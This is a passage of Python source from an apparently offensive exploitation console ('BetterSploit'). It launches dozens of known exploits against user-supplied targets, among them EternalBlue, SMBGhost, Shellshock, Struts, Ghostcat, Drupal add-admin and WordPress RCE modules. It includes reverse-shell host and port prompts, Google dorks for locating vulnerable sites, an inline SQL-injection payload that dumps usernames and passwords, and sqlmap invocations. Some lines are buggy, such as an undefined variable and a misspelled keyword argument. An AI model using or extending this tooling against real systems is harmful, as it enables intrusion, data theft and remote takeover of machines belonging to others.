            account = input(f"{Colors.red}(Dovecot IMAP 1.0.10-1.1rc2 RED{Colors.end} [Enter Account]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/multiple/remote/5257.py {hostname} {account}", shell=True)
        elif fancy_shell == "use Zomplog/3.8.1/AFU" or fancy_shell == "use 16":
            url = input(f"{Colors.red}(Zomplog 3.8.1 Arbitrary File Upload){Colors.end} [Enter Target URL]:~#")
            file = input(f"{Colors.red}(Zomplog 3.8.1 Arbitrary File Upload){Colors.end} [Enter File To Upload]:~#")
            sub.call("php /usr/share/exploitdb/exploits/php/webapps/4466.php", shell=True)
        elif fancy_shell == "use ColdFusion/9-10/Credential-Disclosure" or fancy_shell == "use 17":
            sub.call("python /usr/share/exploitdb/exploits/multiple/webapps/25305.py", shell=True)
        elif fancy_shell == "use Dovecot/IMAP/1.0.10-1.1rc2" or fancy_shell == "use 18":
            hostname = input(f"{Colors.red}(Dovecot IMAP 1.0.10-1.1rc2 RED{Colors.end} [Enter Hostname/Ip-Address]:~#")
            account = input(f"{Colors.red}(Dovecot IMAP 1.0.10-1.1rc2 RED{Colors.end} [Enter Account]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/multiple/remote/5257.py {hostname} {account}", shell=True)
        elif fancy_shell == "use Wolf-CMS/0.8.2/AFU" or fancy_shell == "use 19":
            host = input(f"{Colors.red}(Wolf CMS 0.8.2 Arbitrary File Upload){Colors.end} [Enter Host (localhost)]:~#")
            path = input(f"{Colors.red}(Wolf CMS 0.8.2 Arbitrary File Upload){Colors.end} [Enter Path]:~#")
            user = input(f"{Colors.red}(Wolf CMS 0.8.2 Arbitrary File Upload){Colors.end} [Enter Username]:~#")
            passwd = input(f"{Colors.red}(Wolf CMS 0.8.2 Arbitrary File Upload){Colors.end} [Enter Password]:~#")
            sub.call(f"php /usr/share/exploitdb/exploits/php/webapps/36818.php {host} {path} {user} {passwd}", shell=True)
        elif fancy_shell == "use Wordpress-Plugin/Simple-File-List/5.4/RCE" or fancy_shell == "use 20":
            url = input(f"{Colors.red}(Wordpress Plugin Simple File List 5.4 RCE){Colors.end} [Enter URL]:~#")
            sub.call(f"python3 /usr/share/exploitdb/exploits/php/webapps/48349.py {url}", shell=True)
        elif fancy_shell == "use WordPress-Plugin/Download-Manager/2.7.4/RCE" or fancy_shell == "use 21":
            target_url = input(f"{Colors.red}(use WordPress-Plugin/Download-Manager/2.7.4/RCE){Colors.end} [Enter Target URL]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/php/webapps/35533.py -t {target_url}", shell=True)
        elif fancy_shell == "use WordPress-Plugin/wpDataTables/1.5.3/AFU" or fancy_shell == "use 22":
            target = input(f"{Colors.red}(WordPress Plugin wpDataTables 1.5.3 AFU){Colors.end} [Enter Target URL]:~#")
            file = input(f"{Colors.red}(WordPress Plugin wpDataTables 1.5.3 AFU){Colors.end} [Enter File To Upload]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/php/webapps/35341.py -t {target} -f {file}", shell=True)
        elif fancy_shell == "use Joomla/1.5<3.4.5/Object-Injection/x-forwarded-for/Header/RCE" or fancy_shell == "use 23":
            rhost = input(f"{Colors.red}(Joomla 1.5<3.4.5 Object-Injection x-forwarded-for Header RCE){Colors.end} [Enter Remote Host]:~#")
            lhost = input(f"{Colors.red}(Joomla 1.5<3.4.5 Object-Injection x-forwarded-for Header RCE){Colors.end} [Enter Local Host]:~#")
            local_port = input(f"{Colors.red}(Joomla 1.5<3.4.5 Object-Injection x-forwarded-for Header RCE){Colors.end} [Enter Local Port]:~#")
            cmd = input(f"{Colors.red}(Joomla 1.5<3.4.5 Object-Injection x-forwarded-for Header RCE){Colors.end} [Enter Command]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/php/webapps/39033.py -t {rhost} -l {lhost} -p {local_port} --cmd {cmd}", shell=True)
        elif fancy_shell == "use phosheezy/2.0/RCE" or fancy_shell == "use 24":
            url_to_cms_path = input(f"{Colors.red}(phosheezy 2.0 RCE){Colors.end} [Enter URL To CMS Path]:~#")
            sub.call(f"perl /usr/share/exploitdb/exploits/php/webapps/7780.pl {url_to_cms_path}", shell=True)
        elif fancy_shell == "use Multiple-WordPress-Plugins/AFU" or fancy_shell == "use 25":
            sub.call("python /usr/share/exploitdb/exploits/php/webapps/41540.py", shell=True)
        elif fancy_shell == "use Microsoft-Windows-7/2008-R2/EternalBlue/SMB-(MS17-10)" or fancy_shell == "use 26":
            ip_address = input(f"{Colors.red}(Microsoft Windows-7 2008-R2 EternalBlue SMB-MS17-10){Colors.end} [Enter Ip Address]:~#")
            shell_code_file = input(f"{Colors.red}(Microsoft Windows-7 2008-R2 EternalBlue SMB-MS17-10){Colors.end} [Enter Shellcode File]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/windows/remote/42031.py {ip_address} {shell_code_file}", shell=True)
        elif fancy_shell == "use Microsoft-Windows-8/8.1/2012-R2-(x64)/EternalBlue/SMB" or fancy_shell == "use 27":
            ip_address = input(f"{Colors.red}(Microsoft Windows-7 2008-R2 EternalBlue SMB-MS17-10){Colors.end} [Enter Ip Address]:~#")
            shell_code_file = input(f"{Colors.red}(Microsoft Windows-7 2008-R2 EternalBlue SMB-MS17-10){Colors.end} [Enter Shellcode File]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/windows_x86-64/remote/42030.py {ip_address} {shell_code_file}", shell=True)
        elif fancy_shell == "use Apache-Tomcat-AJP/Ghostcat/File-Read/Inclusion" or fancy_shell == "use 28":
            port = input(f"{Colors.red}(Apache-Tomcat-AJP Ghostcat File-Read Inclusion){Colors.end} [Enter Remote Port]:~#")
            file = input(f"{Colors.red}(Apache-Tomcat-AJP Ghostcat File-Read Inclusion){Colors.end} [Enter Local File To Upload]:~#")
            target = input(f"{Colors.red}(Apache-Tomcat-AJP Ghostcat File-Read Inclusion){Colors.end} [Enter Target Ip Address]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/multiple/webapps/48143.py -p {port} -f {file} {target}", shell=True)
        elif fancy_shell == "use WordPress-Plugin-Zingiri-2.2.3/ajax_save_name.php" or fancy_shell == "use 29":
            host = input(f"{Colors.red}(WordPress-Plugin Zingiri-2.2.3 ajax_save_name.php){Colors.end} [Enter Host]:~#")
            path = input(f"{Colors.red}(WordPress-Plugin Zingiri-2.2.3 ajax_save_name.php){Colors.end} [Enter WP-Plugin Path]:~#")
            sub.call(f"php /usr/share/exploitdb/exploits/php/webapps/18111.php {host} {path}", shell=True)
        elif fancy_shell == "use Apache+PHP-5.3.12<5.4.2/RCE+Scanner" or fancy_shell == "use 30":
            print(f"{Colors.green}python /usr/share/exploitdb/exploits/php/remote/29316.py{Colors.end}")
            sub.call("python /usr/share/exploitdb/exploits/php/remote/29316.py", shell=True)
        elif fancy_shell == "use Apache-CouchDB<2.1.0/RCE" or fancy_shell == "use 31":
            user = input(f"{Colors.red}(Apache CouchDB <2.1.0 RCE){Colors.end} [Enter Username]:~#")
            cmd = input(f"{Colors.red}(Apache CouchDB <2.1.0 RCE){Colors.end} [Enter Command]:~#")
            passwd = input(f"{Colors.red}(Apache CouchDB <2.1.0 RCE){Colors.end} [Enter Password]:~#")
            host = input(f"{Colors.red}(Apache CouchDB <2.1.0 RCE){Colors.end} [Enter Host]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/linux/webapps/44913.py -c {command} -u {user} -p {passwd} {host}", shell=True)
        elif fancy_shell == "use Apache-James-Server/2.3.2/RCE" or fancy_shell == "use 32":
            ip_address = input(f"{Colors.red}(Apache-James-Server 2.3.2 RCE){Colors.end} [Enter Target Ip Address]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/linux/remote/35513.py {ip_address}", shell=True)
        elif fancy_shell == "use Apache-mod_cgi-Shellshock/RCI" or fancy_shell == "use 33":
            bind_or_reverse = input(f"{Colors.red}(Apache-mod_cgi Shellshock Remote Command Injection){Colors.end} [Enter Payload (bind or reverse)]:~#")
            rhost = input(f"{Colors.red}(Apache-mod_cgi Shellshock Remote Command Injection){Colors.end} [Enter Remote Host]:~#")
            lhost = input(f"{Colors.red}(Apache-mod_cgi Shellshock Remote Command Injection){Colors.end} [Enter Local Host]:~#")
            lport = input(f"{Colors.red}(Apache-mod_cgi Shellshock Remote Command Injection){Colors.end} [Enter Local Port]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/linux/remote/34900.py payload={bind_or_reverse} rhost={rhost} lhost={lhost} lport={lport}", shell=True)
        elif fancy_shell == "use Apache/mod_jk/1.2.19/(Windows x86)/RBO" or fancy_shell == "use 34":
            host = input(f"{Colors.red}(Apache mod_jk 1.2.19 (Windows x86) Remote Buffer Overflow){Colors.end} [Enter Host]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/windows_x86/remote/6100.py {host}", shell=True)
        elif fancy_shell == "use Apache-Solr-8.2.0/RCE" or fancy_shell == "use 35":
            ip = input(f"{Colors.red}(Apache-Solr 8.2.0 RCE){Colors.end} [Enter Target Ip Address]:~#")
            port = input(f"{Colors.red}(Apache-Solr 8.2.0 RCE){Colors.end} [Enter Remote Port]:~#")
            cmd = input(f"{Colors.red}(Apache-Solr 8.2.0 RCE){Colors.end} [Enter Command]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/java/webapps/47572.py {ip_address} {port} {cmd}", shell=True)
        elif fancy_shell == "use Apache-Struts/REST-Plugin-With-Dynamic-Method-Invocation/RCE" or fancy_shell == "use 36":
            url = input(f"{Colors.red}(Apache-Struts REST-Plugin-With-Dynamic-Method-Invocation RCE){Colors.end} [Enter URL]:~#")
            cmd = input(f"{Colors.red}(Apache-Struts REST-Plugin-With-Dynamic-Method-Invocation RCE){Colors.end} [Enter Command]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/multiple/remote/43382.py {url} {cmd}", shell=True)
        elif fancy_shell == "use Apache-Struts/2.0.1<2.3.33<2.5<2.5.10/ACE" or fancy_shell == "use 37":
            while True:
                options_check = input(f"{Colors.red}(Apache-Struts 2.0.1<2.3.33<2.5<2.5.10 ACE){Colors.end} [Would You Like To See Options (y or n)]:~#")
                if options_check == "y":
                    print('"url: http://127.0.0.1/" paramater: "name" command: "uname -a"')
                    pass
                param = input(f"{Colors.red}(Apache-Struts 2.0.1<2.3.33<2.5<2.5.10 ACE){Colors.end} [Enter Paramater]:~#")
                url = input(f"{Colors.red}(Apache-Struts 2.0.1<2.3.33<2.5<2.5.10 ACE){Colors.end} [Enter Target URL]:~#")
                cmd = input(f"{Colors.red}(Apache-Struts 2.0.1<2.3.33<2.5<2.5.10 ACE){Colors.end} [Enter Command]:~#")
                sub.call(f"python /usr/share/exploitdb/exploits/multiple/remote/44556.py {url} {param} {cmd}", shell=True)
                break
        elif fancy_shell == "use Apache-Struts/2.3<2.3.34<2.5<2.5.16/RCE" or fancy_shell == "use 38":
            host_port = input(f"{Colors.red}(Apache-Struts 2.3<2.3.34<2.5<2.5.16 RCE){Colors.end} [Enter Host:Port (host:port)]:~#")
            cmd = input(f"{Colors.red}(Apache-Struts 2.3<2.3.34<2.5<2.5.16 RCE){Colors.end} [Enter Command]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/multiple/remote/45262.py {host_port} {cmd}", shell=True)
        elif fancy_shell == "use Apache-Struts/2.3.x/Showcase/RCE" or fancy_shell == "use 39":
            url = input(f"{Colors.red}(Apache-Struts 2.3.x Showcase RCE){Colors.end} [Enter URL]:~#")
            cmd = input(f"{Colors.red}(Apache-Struts 2.3.x Showcase RCE){Colors.end} [Enter Command]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/multiple/webapps/42324.py {url} {cmd}", shell=True)
        elif fancy_shell == "use Apache-Struts/2.5<2.5.12/REST-Plugin-XStream/RCE" or fancy_shell == "use 40":
            url = input(f"{Colors.red}(Apache-Struts 2.5<2.5.12 REST-Plugin-XStream RCE){Colors.end} [Enter URL]:~#")
            cmd = input(f"{Colors.red}(Apache-Struts 2.5<2.5.12 REST-Plugin-XStream RCE){Colors.end} [Enter Command]:~#")
            sub.call(f"python3 /usr/share/exploitdb/exploits/linux/remote/42627.py {url} {cmd}", shell=True)
        elif fancy_shell == "use Apache-Tomcat/WebDAV/Remote-File-Disclosure" or fancy_shell == "use 41":
            remote_host = input(f"{Colors.red}(Apache-Tomcat WebDAV Remote-File-Disclosure){Colors.end} [Enter Remote Host]:~#")
            webdav_file = input(f"{Colors.red}(Apache-Tomcat WebDAV Remote-File-Disclosure){Colors.end} [Enter Remote Host]:~#")
            file_to_retrieve = input(f"{Colors.red}(Apache-Tomcat WebDAV Remote-File-Disclosure){Colors.end} [Enter Remote Host]:~#")
            username = input(f"{Colors.red}(Apache-Tomcat WebDAV Remote-File-Disclosure){Colors.end} [Enter Remote Host]:~#")
            password = input(f"{Colors.red}(Apache-Tomcat WebDAV Remote-File-Disclosure){Colors.end} [Enter Remote Host]:~#")
            sub.call(f"perl /usr/share/exploitdb/exploits/multiple/remote/4530.pl {remote_host} {webdav_file} {file_to_retrieve} {username} {password}", shell=True)
        elif fancy_shell == "use Apache-Tomcat-AJP/Ghostcat/File-Read/Inclusion" or fancy_shell == "use 42":
            port = input(f"{Colors.red}(Apache-Tomcat-AJP Ghostcat File-Read/Inclusion){Colors.end} [Enter Remote Port]:~#")
            file = input(f"{Colors.red}(Apache-Tomcat-AJP Ghostcat File-Read/Inclusion){Colors.end} [Enter File Path]:~#")
            target = input(f"{Colors.red}(Apache-Tomcat-AJP Ghostcat File-Read/Inclusion){Colors.end} [Enter Target Ip Address]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/multiple/webapps/48143.py -p {port} -f {file} {target}", shell=True)
        elif fancy_shell == "use Apache-Tomcat<9.0.1<8.5.23<8.0.47<7.0.8/JSP/Upload-Bypass/RCE" or fancy_shell == "use 43":
            url = input(f"{Colors.red}(Apache-Tomcat<9.0.1<8.5.23<8.0.47<7.0.8/JSP/Upload-Bypass/RCE){Colors.end} [Enter URL]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/jsp/webapps/42966.py -u {url} -p pwn", shell=True)
        elif fancy_shell == "use Joomla-Component-Recerca/SQL-Injection" or fancy_shell == "use 44":
            sub.call("perl /usr/share/exploitdb/exploits/php/webapps/10058.pl", shell=True)
        elif fancy_shell == "use CNC-Telnet/Remote-Command-Execution" or fancy_shell == "use 45":
            sub.call("python3 BetterSploit/modules/telet_rce_exploit.py", shell=True)
        elif fancy_shell == "use OpenSSH-7.2p1/(Authenticated)/xauth-Command-Injection" or fancy_shell == "use 46":
            host = input(f"{Colors.red}(OpenSSH-7.2p1 (Authenticated) xauth-Command-Injection){Colors.end} [Enter Remote Host]:~#")
            port = input(f"{Colors.red}(OpenSSH-7.2p1 (Authenticated) xauth-Command-Injection){Colors.end} [Enter Remote Port]:~#")
            username = input(f"{Colors.red}(OpenSSH-7.2p1 (Authenticated) xauth-Command-Injection){Colors.end} [Enter Username]:~#")
            password_or_priv_key = input(f"{Colors.red}(OpenSSH-7.2p1 (Authenticated) xauth-Command-Injection){Colors.end} [Enter Password Or Path To Private Key]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/multiple/remote/39569.py {host} {port} {username} {password_or_priv_key}", shell=True)
        elif fancy_shell == "use NetGain-EM-Plus/10.1.68/RCE" or fancy_shell == "use 47":
            url = input(f"{Colors.red}(NetGain-EM-Plus 10.1.68 RCE){Colors.end} [Enter URL]:~#")
            cmd = input(f"{Colors.red}(NetGain-EM-Plus 10.1.68 RCE){Colors.end} [Enter Command]:~#")
            sub.call(f"go run /usr/share/exploitdb/exploits/jsp/webapps/47391.go -u {url} -cmd {cmd}", shell=True)
        elif fancy_shell == "use phpMyAdmin/pmaPWN!/Code-Injection/Remote-Code-Execution" or fancy_shell == "use 48":
            sub.call("php /usr/share/exploitdb/exploits/php/webapps/8992.php", shell=True)
        elif fancy_shell == "use phpMyAdmin/3.x/Swekey/Remote-Code-Injection" or fancy_shell == "use 49":
            url = input(f"{Colors.red}(phpMyAdmin 3.x Swekey Remote Code Injection){Colors.end} [Enter URL]:~#")
            sub.call(f"php /usr/share/exploitdb/exploits/php/webapps/17514.php {url}", shell=True)
        elif fancy_shell == "use Broken-faq.php-frameork/Remote-Command-Execution" or fancy_shell == "use 50":
            print(f'GOOGLE DORK: {Colors.green}inurl:faq.php and intext:"Warning:framework()[function.system]"{Colors.end}')
            url = input(f"{Colors.red}(Broken-faq.php-frameork/Remote-Command-Execution){Colors.end} [Enter URL]:~#")
            cmd = input(f"{Colors.red}(Broken-faq.php-frameork/Remote-Command-Execution){Colors.end} [Enter Command]:~#")
            sub.call(f"python3 BetterSploit/modules/basic_rce_exploit.py {url} {cmd}", shell=True)
        elif fancy_shell == "use WzdFTPD/8.0/DOS" or fancy_shell == "use 51":
            target_ip = input(f"{Colors.red}(WzdFTPD/8.0/DOS){Colors.end} [Enter Target Ip Address]:~#")
            port = input(f"{Colors.red}(WzdFTPD/8.0/DOS){Colors.end} [Enter Target Port Number]:~#")
            sub.call(f"python3 /usr/share/exploitdb/exploits/windows/dos/9242.py {target_ip} {port}", shell=True)
        elif fancy_shell == "use Mida-eFramework-2.9.0/RCE" or fancy_shell == "use 52":
            target = input(f"{Colors.red}(Mida eFramework 2.9.0 RCE){Colors.end} [Enter Target URL]:~#")
            cmd = input(f"{Colors.red}(Mida eFramework 2.9.0 RCE){Colors.end} [Enter Command]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/multiple/webapps/48768.py {target} {cmd}", shell=True)
        elif fancy_shell == "use Complaint-Management-System-1.0/cid-SQL-Injection" or fancy_shell == "use 53":
            print(f"""{Colors.blue}
# Title: Complaint Management System 1.0 - 'cid' SQL Injection
# Exploit Author: Mohamed Elobeid (0b3!d)
# Date: 2020-08-21
# Vendor Homepage: https://www.sourcecodester.com/php/14206/complaint-management-system.html
# Software Link: https://www.sourcecodester.com/download-code?nid=14206&title=Complaint+Management+System
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 3.2.4
# Description
This parameter "cid" is vulnerable to Error-Based blind SQL injection in this path "/Complaint%20Management%20System/admin/complaint-details.php?cid=60" that leads to retrieve all databases.
                                {Colors.green}sqlmap -u 'http://target//Complaint%20Management%20System/admin/complaint-details.php?cid=60'  --cookie="PHPSESSID=bb4g25d3qceicepo7b3d26cfpp" --dbms=mysql --dbs{Colors.end}""")
            url = input(f"{Colors.red}(SQL INJECTION:#54){Colors.end} [ENTER URL]:~#")
            sub.call(f'''sqlmap -u "{url}" --cookie="PHPSESSID=bb4g25d3qceicepo7b3d26cfpp" --dbms=mysql --dbs''',
                     shell=True)
        elif fancy_shell == "use 54" or fancy_shell == "use Drupal/7.0-7.31/SQL-Injection-ADD-ADMIN-USER":
            print(f"{Colors.green}python /usr/share/exploitdb/exploits/php/webapps/34992.py{Colors.end}")
            target = input(f"{Colors.red}(SQL Injection:#55){Colors.end} [Enter URL]:~#")
            user = input(f"{Colors.red}(SQL Injection:#55){Colors.end} [Enter USERNAME]:~#")
            passwd = input(f"{Colors.red}(SQL Injection:#55){Colors.end} [Enter PASSWORD]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/php/webapps/34992.py -t {target} -u {user} -p {passwd}",
                     shell=True)
        elif fancy_shell == "use 55" or fancy_shell == "use Webmin/Brute-Force/Remote-Command-Execution":
            sub.call("python3 Webmin-BruteForceCommandExecution.py", shell=True)
        elif fancy_shell == "use 56" or fancy_shell == "use Webmin/<1.290<1.220/Arbitrary-File-Disclosure":
            sub.call("python3 webmin-file-disclosure.py", shell=True)
        elif fancy_shell == "use 57" or fancy_shell == "use Nagios-XI/5.5.6/Remote-Code-Execution/Privilege-Escalation":
            sub.call("python3 Nagios_XI_5.6.5.py", shell=True)
        elif fancy_shell == "use 58" or fancy_shell == "use Nagios-XI/5.2.6<5.4-Chained-Remote-Root":
            sub.call("python3 chainedremoteroot.py", shell=True)
        elif fancy_shell == "use 59" or fancy_shell == "use Apache-Tika-Server/<1.18/Arbitrary-File-Download":
            sub.call("python3 arbitraryfiledownload.py", shell=True)
        elif fancy_shell == "use 60" or fancy_shell == "use Apache-Tika-server/<1.18/Command-Injection":
            sub.call("python3 Apache-Tika-server.py", shell=True)
        elif fancy_shell == "use 61" or fancy_shell == "use IOT-DEATH/Telnet-0-Day/Remote-Command-Execution/POC":
            sub.call("python3 telnet-pwn.py", shell=True)
        elif fancy_shell == "use 62" or fancy_shell == "use Imperva-SecureSphere/<13/Remote-Command-Execution":
            sub.call("python3 imperva.py", shell=True)
        elif fancy_shell == "use 63" or fancy_shell == "use WarFTP-1.65/(Windows 2000 SP4)-USER/Remote-Buffer-Overflow":
            sub.call("python3 warftp.py", shell=True)
        elif fancy_shell == "use 64" or fancy_shell == "use BraveStarr/Remote-Fedora<31-telnetd-exploit":
            sub.call("python3 ../exploitz/bravestarr_module.py", shell=True)
        elif fancy_shell == "use 65" or fancy_shell == "use SSHtranger-Things/Multiple-Exploits":
            sub.call("python3 ../exploitz/sshtranger_things.py", shell=True)
        elif fancy_shell == "use 66" or fancy_shell == "use ManageEngine-Applications-Manager-Authenticated-RCE":
            sub.call("python3 manage-engine-application-manager-authenticated-module.py", shell=True)
        elif fancy_shell == "use 67" or fancy_shell == "use libssh-bypass-Authentication":
            sub.call("python3 libssh-bypass.py", shell=True)
        elif fancy_shell == "use 68" or fancy_shell == "use ClearPass-Policy-Manager-Unauthenticated-RCE":
            sub.call("python3 clearpass-module.py", shell=True)
        elif fancy_shell == "use 69" or fancy_shell == "use Cisco-7937G/All-In-One":
            sub.call("python3 cisco-7937G-module.py", shell=True)
        elif fancy_shell == "use 70" or fancy_shell == "use Agent-Tesla-Botnet/Multi":
            sub.call("python3 agent-tesla-botnet-command-exec.py", shell=True)
        elif fancy_shell == "use 71" or fancy_shell == "use Apache-CouchDB/Pre-Authenticated-Remote-Privilege-Escalation":
            sub.call("python3 apache-couchDB-remote-priv-esc.py", shell=True)
        elif fancy_shell == "use 72" or fancy_shell == "use Cayin-Digital-Signage-System-xPost-2.5/RCI":
            ip_address = input(
                f"{Colors.red}(Cayin Digital Signage System xPost <2.5 Remote Command Injection){Colors.end} [Enter Ip Address]:~#")
            port_number = int(input(
                f"{Colors.red}(Cayin Digital Signage System xPost <2.5 Remote Command Injection){Colors.end} [Enter Port Number]:~#"))
            sub.call(
                f"../exploitz/Cayin-Digital-Signage-System-xPost-2.5-Remote-Command-Injection.py {ip_address}:{port_number}",
                shell=True)
        elif fancy_shell == "use 73" or fancy_shell == "use eGroupWare<1.14-spellchecker/Remote-Command-Execution":
            http_or_https = input(
                f"{Colors.red}(eGroupWare <1.14 spellchecker Remote Command Execution){Colors.end} [http or https?]:~#")
            ip = input(
                f"{Colors.red}(eGroupWare <1.14 spellchecker Remote Command Execution){Colors.end} [Enter Target Ip Address]:~#")
            sub.call(f"python3 ../exploitz/eGroupWare-1.14-spellchecker-RCE.py {http_or_https} {ip}", shell=True)
        elif fancy_shell == "use 74" or fancy_shell == "use FaceSentry-Access-Control-System<6.4.8/Remote-Root-Exploit":
            ip_address_target = input(
                f"{Colors.red}(FaceSentry Access Control System <6.4.8 Remote Root Exploit){Colors.end} [Enter Target Ip Address]:~#")
            sub.call(
                f"python ../exploitz/FaceSentry-Access-Control-System-6.4.8-Remote-Root-Exploit.py {ip_address_target}",
                shell=True)
        elif fancy_shell == "use 75" or fancy_shell == "use Joomla-hdwplayer<4.2/search.php/SQL-Injection":
            sub.call("python3 Joomla-com_hdwplayer-4.2-search.php-SQL-Injection-zero-day.py", shell=True)
        elif fancy_shell == "use 76" or fancy_shell == "use LibreHealth<2.0-Pre-Authenticated-Remote-Command-Execution":
            sub.call("python3 LibreHealth-2.0.0-pre-Authenticated-Remote-Code-Execution.py", shell=True)
        elif fancy_shell == "use 77" or fancy_shell == "use Online-Course-Registration-1.0/Unauthenticated-RCE":
            target_address = input(
                f"{Colors.red}(Online Course Registration <1.0 Unauthenticated Remote Command Execution){Colors.end} [Enter Target URl]:~#")
            sub.call(f"python3 ../exploitz/Online-Course-Registration-1.0-Unauthenticated-RCE.py {target_address}",
                     shell=True)
        elif fancy_shell == "use 78" or fancy_shell == "use PHPFusion<9.03.50-PHP-Object-Injection-to-SQL-injection":
            url = input(
                f"{Colors.red}(PHPFusion <9.03.50 PHP-Object Injection to SQL injection){Colors.end} [Enter URL]:~#")
            sub.call(f"python3 ../exploitz/PHP-Fusion-9.0.60-PHP-Object-Injection-Exploit.py {url}", shell=True)
        elif fancy_shell == "use 79" or fancy_shell == "use Pi-Hole<4.3.2/Pre-Authenticated-Remote-Command-Execution":
            url = input(
                f"{Colors.red}(Pi-Hole <4.3.2 Pre Authenticated Remote Command Execution){Colors.end} [Enter Target URL]:~#")
            user = input(
                f"{Colors.red}(Pi-Hole <4.3.2 Pre Authenticated Remote Command Execution){Colors.end} [Enter Username]:~#")
            password = input(
                f"{Colors.red}(Pi-Hole <4.3.2 Pre Authenticated Remote Command Execution){Colors.end} [Enter Password]:~#")
            local_host = input(
                f"{Colors.red}(Pi-Hole <4.3.2 Pre Authenticated Remote Command Execution){Colors.end} [Enter Local Host]:~#")
            port = input(
                f"{Colors.red}(Pi-Hole <4.3.2 Pre Authenticated Remote Command Execution){Colors.end} [Enter Local Port]:~#")
            sub.call(f"python Pi-Hole-4.3.2-RCE.py -u {url} -p {port} -i {local_host} -pass {password}", shell=True)
        elif fancy_shell == "use 80" or fancy_shell == "use PulseSecure<9.0/Remote-Command-Execution":
            sub.call("python3 ../exploitz/pulsesecure-9.0-RCE.py", shell=True)
        elif fancy_shell == "use 81" or fancy_shell == "use rConfig<3.9.4-search.crud.php":
            sub.call("python3 ../exploitz/rConfig-3.9.4-search.crud.php.py", shell=True)
        elif fancy_shell == "use 82" or fancy_shell == "use Ruby-On-Rails<5.0.1-Remote-Command-Execution":
            url = input(
                f"{Colors.red}(Ruby On Rails <5.0.1 Remote Command Execution){Colors.end} [Enter Target URL]:~#")
            local_h = input(
                f"{Colors.red}(Ruby On Rails <5.0.1 Remote Command Execution){Colors.end} [Enter Local Host]:~#")
            local_p = input(
                f"{Colors.red}(Ruby On Rails <5.0.1 Remote Command Execution){Colors.end} [Enter Local Port]:~#")
            sub.call(f"ruby Ruby-On-Rails-5.0.1-RCE.rb {url} {local_h} {local_p}", shell=True)
        elif fancy_shell == "use 83" or fancy_shell == "use Tailor-Management-System/(id)-SQL-Injection-Vulnerability":
            def exploit(url):
                payload = "id=-1'+union+select+concat(username,0x3a,password),2+from+users-- -"
                googld_dork = f"""
{Colors.green}inurl:tailor/addmeasurement.php?
inurl:tailor/staffedit.php?
inurl:tailor/staffcatedit.php?{Colors.end}\n"""
                r = requests.get(url + payload)
                print(googld_dork)
                print(r.text)

            exploit(url=input(
                f"{Colors.red}(Tailor Management System (id) SQL Injection){Colors.end} [Enter Vulnerable URL]:~#"))
        elif fancy_shell == "use 84" or fancy_shell == "use SMBGhost":
            ip = input(f"{Colors}(SMBGhost){Colors.end} [Enter Ip Address]:~#")
            port = input(f"{Colors}(SMBGhost){Colors.end} [Enter Port]:~#")
            sub.call(f"python SMBGhost/exploit.py -ip {ip} -p {port}", shell=True)
        elif fancy_shell == "use 85" or fancy_shell == "use Symantec-Web-Gateway<5.0.2.8-RCE":
            url = input(
                f"{Colors.red}(Symantec Web Gateway <5.0.2.8 Remote Command Execution){Colors.end} [Enter URL]:~#")
            sub.call(f"python ../exploitz/Symantec-Web-Gateway-5.0.2.8-RCE.py {url}", shell=True)
        elif fancy_shell == "use 86" or fancy_shell == "use Umbraco<7.12.4/Remote-Command-Execution":
            sub.call("python3 umbraco_exploit.py", shell=True)
        elif fancy_shell == "use 87" or fancy_shell == "use CGI-In-WebDAV-Yaws-Web-Server<2.0.7/OS-CMD-Injection":
            sub.call("python3 ../exploitz/cgi-yaws-os-command-injection.py", shel=True)
        elif fancy_shell == "use 88" or fancy_shell == "use WebDAV-implementation-In-Yaws-Web-Server<2.0.7/XXE-injection":
            uri = input(
                f"{Colors.red}(WebDAV implementation In Yaws Web Server <2.0.7 XXE injection){Colors.end} [Enter URI (ex: http, https, ftp)]:~#")
            domain = input(
                f"{Colors.red}(WebDAV implementation In Yaws Web Server <2.0.7 XXE injection){Colors.end} [Enter Domain]:~#")
            port = input(
                f"{Colors.red}(WebDAV implementation In Yaws Web Server <2.0.7 XXE injection){Colors.end} [Enter Server Port]:~#")
            remote_file = input(
                f"{Colors.red}(WebDAV implementation In Yaws Web Server <2.0.7 XXE injection){Colors.end} [Enter Remote File (ex: /etc/passwd)]:~#")
            sub.call(f"python3 ../exploitz/xxe-injection-0day.py -u {uri} -d {domain} -p {port} -f {remote_file}",
                     shell=True)
        elif fancy_shell == "use 89" or fancy_shell == "use Microsoft-Exchange-Server-Static-Key-Flaw/RCE":
            sub.call("python3 ../exploitz/Microsoft-Exchange-Server-Static-Key-Flaw.py", shell=True)
        elif fancy_shell == "use 90" or fancy_shell == "use 'BIG-IP'-Traffic-Management-User<15.1.0.3/RCE":
            sub.call("python ../exploitz/CVE-2020-5902.py", shell=True)
        elif fancy_shell == "use 91" or fancy_shell == "use SMBleedingGhost/CVE-2020-0796-RCE-POC":
            note = input(
                f"""{Colors.red}(SMBleedingGhost CVE-2020-0796 RCE POC){Colors.end} (NOTE: Before We Start Begin Listening With Netcat)
[Press Enter]:~#""")
            if note:
                target_ip = input(
                    f"{Colors.red}(SMBleedingGhost CVE-2020-0796 RCE POC){Colors.end} [Enter Target Ip Address]:~#")
                local_host = input(
                    f"{Colors.red}(SMBleedingGhost CVE-2020-0796 RCE POC){Colors.end} [Enter Local Host]:~#")
                local_port = input(
                    f"{Colors.red}(SMBleedingGhost CVE-2020-0796 RCE POC){Colors.end} [Enter Local Port]:~#")
